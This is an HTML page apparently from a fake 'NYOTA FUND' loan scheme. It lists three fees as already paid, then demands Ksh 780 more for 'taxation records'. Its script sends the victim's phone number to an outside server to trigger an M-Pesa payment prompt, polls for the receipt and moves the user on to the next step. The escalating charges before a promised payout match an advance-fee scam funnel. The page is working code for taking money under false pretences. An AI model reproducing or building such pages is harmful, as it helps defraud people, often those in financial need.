<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>NYOTA FUND â€“ Tax Processing</title>
<link rel="stylesheet" href="style.css" />
<style>
.container{
  max-width:500px;
  margin:auto;
  text-align:center;
}
.status{
  font-size:16px;
  margin:8px 0;
}
.success{ color:green; font-weight:bold; }
.notice{
  margin-top:20px;
  padding:15px;
  background:#f5f5f5;
  border-radius:10px;
  font-size:15px;
  line-height:1.6;
}
button{
  margin-top:20px;
  padding:12px;
  width:100%;
  background:#0a6ebd;
  color:white;
  border:none;
  border-radius:8px;
  cursor:pointer;
}
input{
  width:100%;
  padding:10px;
  margin-top:10px;
}
</style>
</head>
<body>

<!-- LiveChat Widget -->
<script>
  window.__lc = window.__lc || {};
  window.__lc.license = 19513072; // Your LiveChat license ID
  window.__lc.chat_between_groups = false;
  (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
</script>

<div class="container">
  <h2>Final Tax Processing Stage</h2>

  <div class="status success">Processing fee paid âœ…</div>
  <div class="status success">Cross-network fee paid âœ…</div>
  <div class="status success">Commitment fee paid âœ…</div>

  <div class="notice">
    You're in good track. You are required to pay 
    <strong>Ksh 780</strong> for official taxation records and participation.
    <br><br>
    Thank you for supporting NYOTA FUND.
    <br><br>
    <strong>Congratulations ðŸ’¯</strong>
  </div>

  <form id="taxForm">
    <input id="phone" placeholder="07XXXXXXXX" required>
    <button type="submit">Pay Ksh 780 Now</button>
  </form>

  <p id="statusMsg"></p>
</div>

<script>
if(!localStorage.getItem("payment3Completed")){
    window.location.href="payment3.html";
}

const phoneInput = document.getElementById("phone");
const statusMsg = document.getElementById("statusMsg");

const userPhone = localStorage.getItem("userPhone");
if(userPhone){
  phoneInput.value = userPhone;
  phoneInput.readOnly = true;
}

const fund = JSON.parse(localStorage.getItem("selectedFund")) || { amount: 0 };

document.getElementById("taxForm").addEventListener("submit", async e => {
  e.preventDefault();

  const phone = phoneInput.value.trim();
  if(phone.length < 10){
    alert("Enter valid phone number");
    return;
  }

  statusMsg.innerText = "Sending STK push...";
  
  try{
    const res = await fetch("https://nyota-server-collins.onrender.com/pay",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        phone,
        amount:780,
        loan_amount: fund.amount
      })
    });

    const data = await res.json();
    if(!data.success) throw new Error();

    statusMsg.innerText = "STK Sent. Enter your M-Pesa PIN.";
    pollReceipt(data.reference);

  }catch{
    statusMsg.innerText = "Failed to send STK push.";
  }
});

function pollReceipt(ref){
  let attempts = 0;

  const interval = setInterval(async ()=>{
    attempts++;
    if(attempts > 60){
      clearInterval(interval);
      statusMsg.innerText = "Payment taking longer than expected.";
      return;
    }

    try{
      const r = await fetch(`https://nyota-server-collins.onrender.com/receipt/${ref}`,{cache:"no-store"});
      if(!r.ok) return;

      const d = await r.json();
      const status = (d?.receipt?.status || "").toLowerCase();

      if(status === "pending") return;

      clearInterval(interval);

      if(["processing","success","completed","paid"].includes(status)){
        localStorage.setItem("payment4Completed","yes");
        statusMsg.innerText = "Payment confirmed âœ… Redirecting...";
        setTimeout(()=>{
          window.location.href="success.html";
        },3000);
      }else{
        statusMsg.innerText = "Payment failed. Try again.";
      }

    }catch{}
  },5000);
}
</script>

</body>
      </html>
